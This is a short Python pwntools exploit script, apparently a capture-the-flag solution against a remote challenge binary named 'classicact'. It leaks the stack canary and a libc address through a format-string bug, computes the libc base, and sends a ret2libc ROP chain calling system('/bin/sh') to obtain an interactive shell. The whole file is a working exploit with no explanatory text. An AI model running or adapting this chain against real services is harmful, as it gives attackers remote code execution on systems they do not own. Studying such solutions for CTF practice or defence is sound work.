from pwn import *
import time

#io = process("./classicact")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
io = remote("0.cloud.chals.io",10058)
libc = ELF("./libc6_2.31-0ubuntu9.7_amd64.so")

popRdi = 0x4013a3
ret = 0x40101a

# Leak stack canary and libc
formatStr = "%10$p%19$p"

io.sendlineafter("Please enter your name!",formatStr)

io.recvuntil("Hello:\n")
libcleak = int(io.recv(14).decode("ascii"),16)
canaryLeak = int(io.recv(18).decode("ascii"),16)
libc.address = libcleak - libc.symbols["_IO_file_jumps"]

system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))

log.info("_IO_file_jumps: " + hex(libcleak))
log.info("libc base: " + hex(libc.address))
log.info("canary: " + hex(canaryLeak))


# ret2libc
rop  = b"A" * 0x48 
rop += p64(canaryLeak)
rop += b"A" * 8

rop += p64(ret) + p64(popRdi) + p64(binsh) + p64(system)

io.sendlineafter("What would you like to do today?",rop)
io.interactive()
